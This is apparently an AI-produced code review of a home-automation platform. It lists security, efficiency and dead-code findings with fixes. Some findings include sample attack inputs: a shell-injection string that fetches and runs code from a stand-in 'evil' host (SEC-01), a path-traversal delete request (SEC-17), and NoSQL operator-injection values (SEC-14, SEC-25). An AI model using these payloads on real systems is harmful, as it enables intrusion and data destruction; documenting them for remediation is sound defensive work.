# HomeBrain Platform — Code Review (Security / Efficiency / Dead Code)

**Date:** 2026-05-28
**Reviewer:** Claude (Opus) automated multi-agent review, with manual spot-verification of the highest-impact findings
**Type:** Static, read-only review. **No code was executed and no files were changed.**

---

## 1. Scope & Method

**Components reviewed (application code):**

| Component | Tech | ~LOC | Focus |
|---|---|---|---|
| `server/` | Node.js / Express 5 / Mongoose | ~173k | Security (auth, routes, command/FS/SSRF), efficiency, dead code |
| `client/` | React + TypeScript (Vite) | ~76k | XSS, token handling, render perf, dead code |
| `HomeBrainApp/` | Swift (iOS) | ~40k | Secret storage, TLS/ATS, dead code |
| `HomeBrainWatch/` | Swift (watchOS) | — | Secret storage |
| `embedded/elecrow-wall-panel/` | C/C++ (ESP32) | ~8.6k | Firmware secrets, OTA, TLS |
| `broker/` | Node.js | ~3.7k | OAuth/MQTT broker auth |
| `remote-device/` | Node.js (Raspberry Pi agent) | ~3.3k | Hub trust, RCE, update integrity |
| `lambda/` | Node.js (AWS Lambda, Alexa) | ~0.8k | Alexa request validation |
| `shared/` | JS/TS | ~0.7k | Shared config/types |
| `server/scripts/*.py` | Python | — | Command injection, deserialization |

**Excluded:** `node_modules/`, build output (`client/dist`), `.git/`, and the vendored third-party libraries `temp_ctranslate2/` (C++ CTranslate2) and `temp_openwakeword/` (Python) — these are external dependencies, not HomeBrain code.

**Method:** The codebase was partitioned across seven focused read-only review passes (three on server security, one each on server efficiency/dead-code, client, integrations/edge, and native/embedded). The five highest-impact findings were then re-verified by reading the actual source. Findings include a confidence note where exploitability is deployment-dependent or unconfirmed.

> **Caveat:** Severities are estimates based on static analysis. Several items are **deployment-dependent** (e.g., they only bite manual/Docker installs that copy `.env.example`, or attackers with LAN position). This is not a penetration test; no issue was exploited.

---

## 2. Executive Summary

HomeBrain is, overall, a **disciplined and defensively-written** codebase. Notable good practices were confirmed (see §6): nearly all process execution uses argument arrays (no shell), the Caddyfile generator escapes interpolated values, OAuth authorization codes are single-use and hashed, refresh tokens are stored only as SHA-256 hashes, session revocation works, growing collections mostly have TTL indexes, timers are generally cleaned up, and firmware secrets are correctly committed as placeholders.

The risk is concentrated in a few places:

- **The Raspberry Pi "remote-device" listener agent** implicitly trusts the hub and turns that trust into **remote code execution** (shell-string TTS + unsigned auto-update), reachable by a LAN attacker because device↔hub discovery is plaintext `ws://` with no server authentication.
- **The ESP32 wall-panel firmware** flashes OTA images over TLS-validation-disabled HTTPS with no image signature — also LAN-MITM → RCE.
- **Auth hardening gaps**: no rate limiting on login, no startup validation of the JWT secret (plus a hardcoded SSL-key fallback), and CSRF relies solely on `SameSite=Lax`.
- **Secret hygiene**: integration tokens/secrets and the iOS 365-day refresh token are stored in plaintext (DB / `store.json` / `UserDefaults`).
- **Input validation**: `zod` is a dependency but is essentially unused; query filters reach Mongo without sanitization.

**No unauthenticated, internet-reachable RCE or authentication bypass was confirmed.** The High-severity items are LAN/compromised-hub RCE and credential/auth-hardening gaps.

| Category | High | Medium | Low | Total |
|---|---|---|---|---|
| Security | 5 | 17 | 18 | 40 |
| Efficiency | 2 | 4 | 6 | 12 |
| Dead code / correctness | 1 (bug) | 2 | 3 | 6 |

**Top 8 to fix first:** SEC-01, SEC-02, SEC-03 (edge RCE), SEC-04 (login brute force), SEC-05 (JWT secret), SEC-08 (hub trust/transport), SEC-12 (plaintext secrets), DEAD-01 (broken broker-catalog endpoint).

---

## 3. Security Findings

Severity legend: **High** = serious, realistic impact (code execution, credential compromise, auth weakening). **Medium** = meaningful weakness, usually needing some precondition (admin, LAN, specific deploy). **Low** = hardening / defense-in-depth.

### 3.1 High

#### SEC-01 (High) — Remote-device TTS passes server-controlled text into a shell → command injection (RCE)
- **Where:** `remote-device/index.js:1822-1828` (escaping at `:1822`), handlers at `:448` / `:456` (`playTTSResponse(message.text, ...)`)
- **Issue:** `tts_response` / `command_processing` WebSocket messages carry `message.text` from the hub straight into shell strings: `espeak -s 175 -a 150 "${escaped}"` and `pico2wave -w "..." "${escaped}" && aplay ...`. The only sanitization is `text.replace(/"/g, '\\"')`, which does **not** neutralize `$(...)`, backticks, or `\` inside a double-quoted context. **Verified.** Input like `$(curl evil|sh)` executes on the Pi.
- **Impact:** A malicious/compromised hub — or a LAN attacker who impersonates the hub (see SEC-08) — gets arbitrary command execution on every listener device.
- **Fix:** Replace shell strings with `execFile`/`spawn('espeak', ['-s','175','-a','150', text])` using argument arrays; do the same for the `pico2wave`/`aplay` chain. Never build shell command strings from network input.

#### SEC-02 (High) — Remote-device auto-update installs server-supplied code with no signature
- **Where:** `remote-device/index.js:2413-2442` (`handleUpdateAvailable`) → `remote-device/updater.js:55-98,180,193-249`
- **Issue:** `update_available` provides `downloadUrl` + `checksum`; the device downloads (HTTP allowed, `updater.js:61`), verifies only the **server-provided** SHA-256 (skipped entirely if `checksum` is falsy, `updater.js:80`), then overwrites `index.js`/`updater.js` and runs `npm ci`. There is no cryptographic signature, so the self-provided checksum adds no integrity guarantee.
- **Impact:** A compromised hub or a plaintext-download MITM yields persistent RCE on the listener.
- **Fix:** Require a detached code signature verified against a pinned public key before install; require HTTPS for `downloadUrl`; fail closed when a signature/checksum is missing.

#### SEC-03 (High) — Wall-panel firmware OTA: TLS validation disabled + unsigned image (RCE)
- **Where:** `embedded/elecrow-wall-panel/src/main.cpp:784` (`secureClient.setInsecure()` for all HTTPS), OTA flow `:3638-3838`, image check `:3809` (`Update.end()` verifies checksum only). **Verified.**
- **Issue:** For any `https://` URL the panel disables certificate validation, including the OTA firmware download. The flashed image is only integrity-checked (ESP32 image checksum), **not authenticated** (no signature). The download URL comes from server-supplied `gState.ota.downloadUrl`.
- **Impact:** A network MITM serves arbitrary firmware that the panel flashes and boots → full device takeover.
- **Fix:** Pin the hub CA/leaf cert (`setCACert`) at least for the OTA channel; add a signed-image scheme (verify a server signature over the image, or enable ESP32 Secure Boot + signed app images) before `Update.end()`/restart.

#### SEC-04 (High) — No rate limiting on authentication or OIDC token endpoints
- **Where:** `server/routes/authRoutes.js` — `POST /login` (`:71`), `/refresh` (`:214`), `/register` (`:137`), `/oidc/exchange` (`:114`); `server/routes/oidcRoutes.js` — `/oauth/authorize` (`:27`), `/oauth/token` (`:35`). No global limiter in `server.js`.
- **Issue:** `express-rate-limit` is applied to many feature routers (devices, panels, watch, etc.) but **not** to the highest-value targets. `POST /login` runs a bcrypt compare with no throttle.
- **Impact:** Unlimited online password guessing / credential stuffing.
- **Fix:** Add a strict limiter (keyed on IP + email) to `/login`, `/refresh`, `/register`, `/oidc/exchange`, and `/oauth/token`, mirroring the limiters used elsewhere.

#### SEC-05 (High) — JWT/refresh secret not validated at startup; verification silently skipped if unset; hardcoded SSL-key fallback
- **Where:** `server/utils/auth.js:16,31`; `server/routes/middlewares/auth.js:80-93`; `server/.env.example:19-20` (placeholder `replace-me-with-a-random-secret`); hardcoded fallback `server/models/SSLCertificate.js:137,150` (`process.env.JWT_SECRET || 'homebrain-ssl-secret'`). **Verified** `auth.js:80` wraps verification in `if (process.env.JWT_SECRET)`.
- **Issue:** Nothing rejects the shipped placeholder/empty secret at boot. If `JWT_SECRET` is unset, HS256 verification is **skipped** and the request falls through to the OIDC verifier. The SSL private-key encryption key falls back to the constant `'homebrain-ssl-secret'`. The Linux installer does generate strong secrets via `openssl rand -hex 32`, so this primarily bites **manual/Docker deployments** that copy `.env.example`.
- **Impact:** Deployments running with the public placeholder secret allow token forgery / full auth bypass; the SSL fallback key is a known constant.
- **Fix:** Fail fast at startup if `JWT_SECRET`/`REFRESH_TOKEN_SECRET` are missing, too short, or equal to the placeholder; remove the `'homebrain-ssl-secret'` fallback.

### 3.2 Medium

#### SEC-06 (Medium) — iOS app stores long-lived tokens in `UserDefaults` instead of Keychain
- **Where:** `HomeBrainApp/HomeBrainApp/Core/SessionStore.swift:38-39,74-75,289-290,311-312`
- **Issue:** `accessToken` and the **365-day** `refreshToken` are persisted in `UserDefaults` (an unencrypted plist), captured in unencrypted backups and readable on a compromised/jailbroken device. The **Watch app already does this correctly** via Keychain (`HomeBrainWatch/.../KeychainStore.swift`), making iOS the inconsistent weaker side.
- **Fix:** Move both tokens to the Keychain (`kSecClassGenericPassword`, `kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly`), mirroring the Watch's `KeychainStore`; migrate and delete the `UserDefaults` values.

#### SEC-07 (Medium) — No CSRF defense beyond `SameSite=Lax` for cookie sessions
- **Where:** `server/utils/authCookies.js:7-9` (`SameSite` defaults `lax`); `server/server.js:194-206` (`credentials:true`; `X-CSRF-Token` advertised in `allowedHeaders` but never validated). Access-token cookie accepted for all verbs (`auth.js:14`).
- **Issue:** Browser sessions authenticate via cookie for POST/PUT/DELETE with no CSRF token check anywhere. `SameSite=Lax` blocks most cross-site mutations, but GET-triggered actions and the `GET /oauth/authorize` flow remain exposed, and the advertised `X-CSRF-Token` header gives a false impression of protection.
- **Fix:** Require the bearer token (not cookie) for state-changing requests, or implement a real double-submit CSRF token validated server-side (or `SameSite=Strict` + origin checks) for cookie-authenticated mutations.

#### SEC-08 (Medium) — Listener trusts hub identity; plaintext `ws://` discovery, no server authentication
- **Where:** `remote-device/index.js:2287` (`ws://${hubInfo.address}`), `:300-368` (device authenticates *to* hub but never authenticates the hub), `:1969/1974`
- **Issue:** During mDNS discovery the device connects over unencrypted `ws://` and treats a successful open as "approved," then acts on all subsequent messages (TTS, config, updates) without verifying server identity. No cert pinning even on the `wss://` path.
- **Impact:** This is the enabler that elevates SEC-01/SEC-02 from "compromised hub" to "any LAN attacker."
- **Fix:** Require TLS + pin the hub cert/public key; authenticate the server side of the channel (mutual token in the handshake); never act on `update_available`/`tts_response` from an unauthenticated peer.

#### SEC-09 (Medium) — OAuth callback CSRF: `state` is a timestamp, never validated (SmartThings & Ecobee)
- **Where:** SmartThings `server/services/smartThingsService.js:840` (`state: Date.now().toString()`), `:866-908`; Ecobee `server/services/ecobeeService.js:176,182-211`; callbacks `server/routes/smartThingsRoutes.js:101`, `server/routes/ecobeeRoutes.js:76`
- **Issue:** `state` is predictable and never compared to a stored per-session value, so the OAuth linking flow has no CSRF protection. An attacker can craft `/callback?code=...` to bind their own cloud account to the victim's hub.
- **Fix:** Generate a random `state`, store it bound to the admin session, and reject mismatches (constant-time).

#### SEC-10 (Medium) — TLS verification hard-disabled for all RainMachine calls; token in URL
- **Where:** `server/services/rainMachineService.js:1464,1495,1559` (`new https.Agent({ rejectUnauthorized:false })`), token in query string at `:1549`
- **Issue:** Every HTTPS request to the RainMachine controller disables cert validation unconditionally (unlike INSTEON, which gates this behind `connection.ignoreTlsErrors`). The login password and `access_token` traverse a MITM-able channel; the token is also exposed in the URL.
- **Fix:** Make TLS-bypass an explicit per-integration opt-in (default secure); send the token in a header, not the query string.

#### SEC-11 (Medium) — Alexa custom-skill audio: hardcoded signing-secret fallback + `clipId` path traversal
- **Where:** `server/services/alexaCustomSkillService.js:84-88` (`getSigningSecret()` → `'homebrain-alexa-custom-audio-secret'` fallback), `:160-176` (`resolveAudioClip`), `:80-82` (`path.join(AUDIO_ROOT, clipId + '.mp3')`); unauthenticated route `server/routes/alexaRoutes.js:488`
- **Issue:** If neither `HOMEBRAIN_ALEXA_AUDIO_SIGNING_SECRET` nor `JWT_SECRET` is set, audio tokens are HMAC'd with a public constant, letting anyone forge `?token=` values. `clipId` is only `trimString`'d (no allowlist), and `../` is not stripped before `path.join`, so a forged token enables arbitrary `*.mp3` path read.
- **Fix:** Fail closed when no real secret is configured; validate `clipId` against `^[a-f0-9]{20}$` before use.

#### SEC-12 (Medium) — Secrets stored in plaintext at rest
- **Where:** broker `broker/src/store.js:233` (hub `relayToken`), `:609-610` (Alexa LWA `accessToken`/`refreshToken`) in `store.json`; `server/models/SmartThingsIntegration.js:36-58` (`clientSecret`, `accessToken`, `refreshToken` plaintext in Mongo); same pattern across ecobee/govee/etc. integration models.
- **Issue:** Long-lived reversible credentials (LWA grant tokens, hub relay token, integration client secrets/tokens) are stored as cleartext. Any file/DB read (backup, misconfig, secondary vuln) discloses live credentials. (No evidence they are returned to clients — SmartThings masks via `toSanitized()`.)
- **Fix:** Encrypt secrets at rest (e.g. libsodium secretbox with a key from env/KMS); tighten store-file/DB permissions.

#### SEC-13 (Medium) — `GET /api/settings/:key` returns unredacted secret values
- **Where:** `server/routes/settingsRoutes.js:614-625` → `server/services/settingsService.js:253-265`. **Verified** the single-key endpoint returns the raw value.
- **Issue:** `GET /api/settings` returns `getSanitizedSettings()`, but `GET /api/settings/:key` returns `settings[key]` directly, so `GET /api/settings/openaiApiKey` (or `anthropicApiKey`, `elevenlabsApiKey`, SMB/SMTP creds) yields the plaintext secret. Admin-only, but bypasses the sanitization applied everywhere else.
- **Fix:** Apply the same sensitive-field redaction/allow-list to the single-key endpoint, or block reads of known-sensitive keys.

#### SEC-14 (Medium) — Mongo operator injection via unvalidated query filters
- **Where:** `server/services/deviceService.js:341-348` (from `deviceRoutes.js:65-70`); `server/services/userProfileService.js` `getAllProfiles` (from `userProfileRoutes.js:19-28`); `server/routes/telemetryRoutes.js:27-34`
- **Issue:** Query params are copied straight into Mongo filters (`query.room = filters.room` → `.find(query)`). Express's `qs` parser turns `?room[$ne]=x` into an object, enabling operator injection (`$ne`, `$gt`, `$regex`). Impact is limited (read-only, Mongoose casts on typed fields), but untyped fields and `$regex` DoS are reachable.
- **Fix:** Coerce these params to strings (reject objects) or use `.find(query, null, { sanitizeFilter: true })`.

#### SEC-15 (Medium) — Input validation effectively absent despite `zod` dependency
- **Where:** `server/package.json` (zod `^4.3.6`); `zod` imported only in `server/services/openclawToolCatalog.js`
- **Issue:** No route performs schema validation; handlers use ad-hoc `if (!field)` checks and pass bodies largely intact into services. Combined with no `express-mongo-sanitize`, this underpins SEC-14 and the mass-assignment items.
- **Fix:** Introduce zod schemas (body/query/params) on state-changing and filter endpoints, rejecting unexpected types/keys.

#### SEC-16 (Medium) — Workflow `http_request` action: SSRF + opt-in TLS bypass
- **Where:** `server/services/workflowExecutionService.js:2008-2063` (`executeHttpRequest`), dispatch `:2663-2664`, TLS bypass `:2036-2038`
- **Issue:** Issues `axios.request` to a fully arbitrary `url` with no allowlist and no block on loopback / link-local / RFC-1918 / cloud-metadata (`169.254.169.254`), follows redirects, and sets `rejectUnauthorized:false` when the author passes `insecureTls:true`. Workflow create/update is admin-only, but `POST /:id/execute` is available to any authenticated user. Can reach the server's own `/internal/*` and the Caddy admin API on `127.0.0.1:2019`.
- **Fix:** Resolve the target host and reject private/loopback/link-local/metadata IPs (guard against DNS rebinding by validating the resolved IP) behind an opt-in allowlist; remove/strongly-gate the `insecureTls` escape hatch.

#### SEC-17 (Medium) — Path traversal → arbitrary recursive delete in Piper voice removal
- **Where:** `server/services/piperVoiceService.js:331-334` (`removeVoice`), route `server/routes/piperVoiceRoutes.js:41-43` (`DELETE /:voiceId`), mounted at `/api/wake-words/voices`
- **Issue:** `path.join(VOICES_ROOT, id)` then `fsExtra.remove(voiceDir)` with `id` = unvalidated `req.params.voiceId`. `DELETE /api/wake-words/voices/..%2f..%2f..%2fsomedir` resolves outside `VOICES_ROOT` and recursively deletes it. Admin-gated, so privileged destruction rather than unauthenticated RCE.
- **Fix:** Validate `voiceId` against `^[A-Za-z0-9._-]+$` (reject `..`) and assert the resolved path stays within `VOICES_ROOT` (the `startsWith(root + sep)` check used in `generalDownloadStorage`).

#### SEC-18 (Medium) — CORS reflects the request `Host` as an allowed origin with `credentials:true`
- **Where:** `server/server.js:171-208` (`buildCorsOptions` adds a `requestOrigin` from `req.get('host')`, `:172-178`), with `credentials:true` (`:194`)
- **Issue:** The allowed-origin set always includes an origin derived from the inbound `Host`. When `CLIENT_URL`/`*_PUBLIC_BASE_URL` are unset (as in `.env.example`), a request reaching the box on an unexpected host/IP gets `Access-Control-Allow-Origin` reflected with credentials. (`trust proxy` is correctly limited to loopback/private, which helps.)
- **Fix:** Do not fold the request-derived origin into the credentialed allow-list; rely solely on explicitly configured origins (+ dev localhost).

#### SEC-19 (Medium) — OIDC issuer derived from `Host` header when no public base URL is configured
- **Where:** `server/utils/publicOrigin.js:23-36` (`getRequestOrigin` falls back to `req.get('host')`), used as `issuer` in `server/services/oidcService.js:544,670-677` and discovery `:279`
- **Issue:** With `HOMEBRAIN_PUBLIC_BASE_URL`/`PUBLIC_BASE_URL` unset, the OIDC `issuer`, advertised endpoints, and `iss` claim come from the attacker-controllable `Host`. Tokens remain RSA-signed (no forgery), but discovery/issuer can be pinned to an attacker-chosen string. *(Marked unconfirmed as a full bypass; mitigated when the public base URL is set.)*
- **Fix:** Require a configured public origin for the OIDC provider; reject requests whose `Host` doesn't match.

#### SEC-20 (Medium) — Access tokens minted without a session id (`sid`) cannot be revoked
- **Where:** `server/routes/authRoutes.js:128` (`/oidc/exchange` → `generateAccessToken(user)` with no `sessionId`); enforcement only runs `if (decoded?.sid)` in `auth.js:83-85`
- **Issue:** The `/oidc/exchange` 1-day token carries no `sid`, so logout / session revocation does not invalidate it. Any future `sid`-less minting has the same gap.
- **Fix:** Always bind issued access tokens to an active session (`sid`), or maintain a denylist for `sid`-less tokens.

#### SEC-21 (Medium) — iOS App Transport Security fully disabled
- **Where:** `HomeBrainApp/HomeBrainApp.xcodeproj/project.pbxproj:357,395,433,469` — `NSAppTransportSecurity = { NSAllowsArbitraryLoads = YES; NSAllowsLocalNetworking = YES; }` (all four build configs)
- **Issue:** Permits cleartext HTTP to *any* host, not just the local hub (default URL is `http://homebrain.local:3000`). Only the scoped `NSAllowsLocalNetworking` is needed for a LAN hub. (No custom TLS-bypass `URLSession` delegate exists — good.)
- **Fix:** Remove `NSAllowsArbitraryLoads`; keep `NSAllowsLocalNetworking` (+ a narrow `NSExceptionDomains` entry for the hub if required).

#### SEC-22 (Medium) — Account enumeration on login + user-count leak
- **Where:** `server/services/userService.js:130-143`, `server/routes/authRoutes.js:82-86`; `GET /registration-status` `authRoutes.js:326-342`
- **Issue:** Invalid credentials return a generic message (good), but a valid email with an inactive / no-platform-access account returns distinct 403s, confirming which emails are real. `/registration-status` returns exact `userCount`.
- **Fix:** Return a uniform failure for all login outcomes; avoid exposing precise user counts on an unauthenticated endpoint.

### 3.3 Low

- **SEC-23 (Low) — HS256 `jwt.verify` does not pin `algorithms`.** `server/routes/middlewares/auth.js:82` (contrast the OIDC path which pins `RS256` at `oidcService.js:675`). Algorithm confusion is mitigated here because the two paths use different keys, but pinning `{ algorithms: ['HS256'] }` is correct defense-in-depth.
- **SEC-24 (Low) — Mass assignment on admin-only model writes.** `server/services/deviceService.js:479,549`; `server/routes/userProfileRoutes.js:292`. Full bodies reach `new Model()` / `findByIdAndUpdate`. Limited impact (admin-only, no privilege fields in those schemas; `userService`/`settingsService` correctly use allow-lists). Add explicit field allow-lists for device/profile writes too.
- **SEC-25 (Low) — NoSQL injection via `req.body.email` in logout.** `server/routes/authRoutes.js:193` (`User.findOne({ email })`, no normalization). `{"email":{"$ne":null}}` matches an arbitrary user, but only revokes that user's refresh token (limited self-DoS). The login path is safe (`normalizeEmail` coerces non-strings). Coerce `email` to a string.
- **SEC-26 (Low) — Non-constant-time panel credential comparison.** `server/services/wallPanelService.js:806,810` use `===`. Near-unexploitable over a network; the Alexa broker already uses `crypto.timingSafeEqual` (`alexaBridgeService.js:31`). Use it here too for consistency.
- **SEC-27 (Low) — bcrypt password cost is 10.** `server/utils/password.js:9-10` (`genSalt()` default). Acceptable but below current guidance (12+; integration tokens already use 12). Use an explicit, configurable cost ≥ 12.
- **SEC-28 (Low) — Any authenticated user can mint a 365-day, non-rotating watch session.** `server/routes/watchRoutes.js:62-94` + `server/services/authSessionService.js:143-166,250-264`. Token is bound to the calling user (no cross-account escalation), but a captured iOS/watch refresh token is replayable for up to a year (no rotation). Rotate refresh tokens on every refresh and/or shorten the default.
- **SEC-29 (Low) — OIDC accepts `plain` PKCE method (downgrade).** `server/services/oidcService.js:520-540,29`. Clients are created with `requirePkce:true`, but the *method* is client-chosen at authorize time. Reject `plain`; require `S256`.
- **SEC-30 (Low) — Operator-controllable Codex executable path.** `server/services/codexCliService.js:224-271,531` — `codexPath`/`codexHome` from stored settings become the spawned command. Admin-only config foot-gun (no shell). Constrain to an allowed directory, or document that editing Codex settings equals code execution.
- **SEC-31 (Low) — `/internal/*` loopback gate reachable via the public Caddy proxy.** `server/routes/internalCaddyRoutes.js:7-19`, `internalAxiomRoutes.js:7-19` authorize on socket peer = loopback, but `server/services/reverseProxyService.js:559-571` proxies the whole host to the backend, so `https://<host>/internal/...` arrives from `127.0.0.1`. Impact limited (endpoints return a policy decision / trigger a local re-sync). Add a Caddy path matcher excluding `/internal/*` and/or a shared-secret header.
- **SEC-32 (Low) — ACME HTTP-01 challenge token used in `path.join` unsanitized.** `server/services/letsEncryptService.js:197-202`. Safe with the real Let's Encrypt CA (fixed directory URL), but a malicious/MITM'd ACME endpoint could traverse. Validate against `^[A-Za-z0-9_-]+$` and assert containment.
- **SEC-33 (Low) — Broker accepts any `client_secret` when none is configured.** `broker/src/app.js:135-140` — empty `expectedSecret` skips the check. Refuse `authorization_code`/`refresh_token` grants unless a client secret is configured.
- **SEC-34 (Low) — No replay protection on SmartThings webhook.** `server/services/smartThingsWebhookService.js:810-849` — HMAC verification is correct (timing-safe, fails closed) but has no timestamp/nonce window. Bind a timestamp into the signed material and reject stale/duplicate requests.
- **SEC-35 (Low) — Alexa skill `applicationId` never verified.** `lambda/src/customSkillHandler.js:29-44`, `shared/alexa/customSkill.js:31-49`. Defense-in-depth only (the broker dispatch is gated by a valid linked-account bearer token). Assert `context.System.application.applicationId` matches the expected skill ID.
- **SEC-36 (Low) — Verbose errors / sensitive data in logs.** Pervasive `res.json({ error: error.message })` (~50 route files; no stack traces leaked — handled by `sendUnhandledError`, `server.js:575-583`); full-error logging on refresh (`authRoutes.js:250-251`); OAuth `code`/token material logged (`smartThingsRoutes.js:105`, `smartThingsService.js:911-915`). Return generic 5xx messages; redact secrets from logs.
- **SEC-37 (Low) — Client renders server-provided URLs into `href`/`window.open` without scheme validation.** `client/src/components/settings/DeviceCatalogUpdateCard.tsx:185`; `client/src/pages/Settings.tsx:7553,3368,3494,2753`; `client/src/components/remote/RemoteDeviceSetup.tsx:412,481`; `client/src/components/ollama/ModelManager.tsx:670`. A `javascript:` URL would execute on click; `location.href` assignment is an open-redirect vector. Data is backend-sourced (low likelihood). Validate with `new URL()` and allow only `http(s):`.
- **SEC-38 (Low) — Client `dangerouslySetInnerHTML` builds `<style>` from a server-sourced color.** `client/src/components/ui/chart.tsx:81`; only non-literal value is `client/src/pages/SenseEnergy.tsx:237` (`device.color` from the Sense API). Worst case CSS injection (not script exec). Validate color strings against a hex/`rgb()` pattern.
- **SEC-39 (Low) — Panel↔hub traffic defaults to plaintext HTTP.** `embedded/.../HomeBrainPanelConfig.h:15` (`http://homebrain.local:3000`); the registration code is sent as header/query in cleartext (`main.cpp:803,3310,3382`). Reasonable for local-first, but combined with SEC-03 it makes MITM trivial. Prefer HTTPS where available.
- **SEC-40 (Low) — iOS access token can be placed in URL query (latent).** `HomeBrainApp/.../Core/APIClient.swift:79-89` (`streamURL(includeAccessTokenQuery:)`). No caller passes `true` today, so it's latent. Remove the unused parameter; always send tokens via the `Authorization` header.

---

## 4. Efficiency Findings

### 4.1 High

#### EFF-01 (High) — `Settings.getSettings()` hits the DB on every call, with no cache, no `.lean()`, and a log line each time
- **Where:** `server/models/Settings.js:415-418`; ~68 call sites across services/routes
- **Issue:** The Settings collection is a singleton, but every settings-dependent request runs a fresh `findOne()` returning a full Mongoose doc, logs `console.log('Settings: Getting application settings')` (log spam on an always-on server), and can trigger `.save()` migrations on a read path (`:423,428,444`).
- **Fix:** Cache the singleton in memory with a short TTL (or invalidate on update); add `.lean()` for read-only callers; remove the per-call log.

#### EFF-02 (High) — Global raw-body `Buffer` copy on every `/api` JSON request, needed by one route
- **Where:** `server/server.js:313-320` (`express.json({ verify })` copies `Buffer.from(buf)` into `req.rawBody`, up to the 8 MB limit) — consumed only by the SmartThings webhook (`smartThingsWebhookService.js:439-440`, `smartThingsWebhookRoutes.js:17`)
- **Issue:** Every other API request pays a full body copy synchronously for signature verification only one endpoint needs.
- **Fix:** Capture the raw body only on the webhook route (route-scoped `express.json({ verify })` / `express.raw()`); use the default parser elsewhere.

### 4.2 Medium

#### EFF-03 (Medium) — Voice audio-session memory leak when a device disconnects mid-stream
- **Where:** `server/websocket/voiceWebSocket.js:1162-1179` (`handleDisconnection` deletes only `deviceConnections`); `audioSessions` deleted only on the `isFinal` branch (`:998`); buffers grow at `:951-976`
- **Issue:** If a device drops without `isFinal` (common on flaky Wi-Fi), the `audioSessions` entry — including accumulated `session.chunks` audio buffers — is never freed. Also `session.chunks` has no size cap, and the `deviceConnections.delete` runs *after* an awaited DB update (a DB error skips the delete).
- **Fix:** Delete `audioSessions` alongside `deviceConnections` in `handleDisconnection`; move map deletes before/independent of the awaited DB update; cap total `session.chunks` bytes.

#### EFF-04 (Medium) — `ReverseProxyAuditLog` grows unbounded (no TTL, no pruning)
- **Where:** `server/models/ReverseProxyAuditLog.js:49-53` (plain indexes only); written from 9 sites via `reverseProxyService.js:681`; no `deleteMany`/prune anywhere
- **Issue:** Every route create/update/delete/validation/apply writes an audit row that is never expired. It's the lone log/sample/history model without a TTL (growth is moderate — gated on `options.actor`).
- **Fix:** Add a TTL index (mirror `EventStreamEvent`) or prune in `maintenanceService`.

#### EFF-05 (Medium) — Telemetry `getSeries` loads all matching samples into memory before downsampling
- **Where:** `server/services/telemetryService.js:3046-3052` (bound `recordedAt >= now - hours`, `MAX_QUERY_HOURS = 24*365`); `maxPoints` cap applied only after the full fetch (`:3071`)
- **Issue:** A high-frequency source over a long window can pull a very large doc set into memory (it does use `.select(...).lean()`, but there's no row cap).
- **Fix:** Add a generous `.limit()`, or push downsampling into a MongoDB aggregation (`$bucket`/`$sample`) so memory is bounded.

#### EFF-06 (Medium) — `getAllProfiles` uses unanchored `$regex` from raw input + 4-way `populate`
- **Where:** `server/services/userProfileService.js:218,221-226` (also `:306,366`)
- **Issue:** `filters.name` goes straight into `$regex` (unindexed scan + ReDoS exposure — see SEC-14) and the list query fans out four `populate()`s.
- **Fix:** Escape and anchor the pattern (the codebase already has `escapeRegexLiteral`); narrow the populate selection / add `.lean()`.

### 4.3 Low

- **EFF-07 (Low) — Read-only list queries hydrate full Mongoose docs instead of `.lean()`.** `server/services/remoteUpdateService.js:563,607,632`; `eventStreamService.js:149,193`; `sslService.js:19,509`. Small/bounded collections, minor impact.
- **EFF-08 (Low) — `matterService` blocking `spawnSync` (+ sync FS).** `server/services/matterService.js:707,928` (and `existsSync`/`readdirSync`). Admin/Thread-setup paths, not per-request, but a slow child stalls the event loop. Prefer async `spawn`/`fs.promises`.
- **EFF-09 (Low) — Broker rate-limit `buckets` Map grows unbounded.** `broker/src/app.js:326-356` — keyed by client IP, never evicted. Add periodic cleanup of expired buckets.
- **EFF-10 (Low) — Broker store prunes on every read/write + deep-clones via JSON.** `broker/src/store.js:173-190,37-43`. Fine at small scale; throttle pruning (time-based) as token volume grows.
- **EFF-11 (Low) — Client `AuthContext` provider value recreated every render.** `client/src/contexts/AuthContext.tsx:140-152` — new value object + inline `hasRole`/`hasPlatform` each render re-renders all consumers (state changes only on auth events, so impact is small). Wrap in `useMemo`/`useCallback`.
- **EFF-12 (Low) — No list virtualization (not yet a problem).** Device grids (`Devices.tsx`, `DeviceGroups.tsx`) and logs (`Operations.tsx`, bounded to 250/400). Consider windowing only if device counts grow into the thousands.

---

## 5. Dead Code & Correctness Findings

#### DEAD-01 (Bug, High-value) — `/api/alexa/broker/catalog` always throws `ReferenceError` → 500
- **Where:** `server/routes/alexaRoutes.js:442-445`. **Verified:** handler signature is `async (_req, res)` but the body references `req.alexaBrokerRegistration` at `:445`. `req` is undefined → `ReferenceError` → caught → 500.
- **Impact:** The broker catalog endpoint is **broken** (always 500); the `appendActivity` audit side-effect is dead. The sibling `/broker/state` (`:502`) correctly uses `(req, res)`.
- **Fix:** Rename `_req` → `req`.

#### DEAD-02 (Medium) — Unused shadcn/ui components + their exclusive npm dependencies (client)
- **Where:** `client/src/components/ui/` — zero importers for: `accordion`, `aspect-ratio`, `avatar`, `breadcrumb`, `calendar`, `carousel`, `collapsible`, `context-menu`, `drawer`, `dropdown-menu`, `form`, `input-otp`, `menubar`, `navigation-menu`, `pagination`, `resizable`, `sidebar`, `sonner`, `toggle-group`
- **Resulting orphaned `client/package.json` deps** (each used only by a dead component): `embla-carousel-react`, `input-otp`, `react-resizable-panels`, `react-day-picker`, `sonner`, `next-themes`, `vaul`, and Radix packages `@radix-ui/react-accordion`, `-aspect-ratio`, `-avatar`, `-context-menu`, `-dropdown-menu`, `-menubar`, `-navigation-menu`, `-toggle-group`, `-collapsible`. (The app uses its own Radix `toaster.tsx`, not `sonner`.)
- **Confidence:** High for component files (exact-path grep); Medium-High for deps (1:1 mapping). Tree-shaking keeps these out of the bundle, but they remain in `node_modules`/lockfile.
- **Fix:** Delete the unused `ui/*.tsx` files and remove the orphaned dependencies.

#### DEAD-03 (Medium) — `voicePollingManager` singleton is never used (client)
- **Where:** `client/src/services/voicePollingManager.ts` (exported singleton at `:183`). No importers anywhere in `src` (voice polling is handled elsewhere). **Confidence: High.**
- **Fix:** Delete the file.

#### DEAD-04 / 05 / 06 (Low)
- **DEAD-04 — Server exported-but-never-imported helpers.** `server/utils/dashboardViews.js` (`createDashboardEntityId:248`, `normalizeDashboardView:251`, `normalizeWidget:253`) and `server/utils/platformUrls.js` (`getAudiobookPublicOrigin:113`). The functions are live (called within their own module); only the *exports* are unused. Drop them from `module.exports`, keep the functions.
